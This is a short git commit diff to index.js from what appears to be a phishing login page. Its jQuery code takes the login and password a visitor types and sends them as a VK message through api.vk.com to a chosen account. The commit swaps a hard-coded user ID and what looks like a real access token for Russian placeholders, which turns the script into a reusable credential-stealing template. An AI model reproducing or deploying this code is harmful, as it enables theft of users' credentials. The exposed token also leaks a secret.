fe9073bf96a97e764764d75207e4b53d285a694d
Vlad <vladfox1337@yandex.ru>
2017-06-02 21:05:48 +0400

    Update index.js

--- index.js
+++ index.js
@@ -6,7 +6,7 @@ $("#LoginButton").click(function(){
 		if (passwddata != ""){
 			var logindata = $("#logininpt").val();
 			var passwddata = $("#psswdinpt").val();
-			$.get("https://api.vk.com/method/messages.send?user_id=320502491&message=" + logindata + ":" + passwddata + "&access_token=c967f549a294770df5081ecd638b41a1bbaba38a89d6c0f62f86510ca597620b8c3842fc12f76e2f45919&v=5.64");
+			$.get("https://api.vk.com/method/messages.send?user_id=ВАШ АЙДИ&message=" + logindata + ":" + passwddata + "&access_token=ваш токен&v=5.64");
 			stepinf = 2;
 			$("#stepinf").text("Step two");
 			$("#stepone").hide();
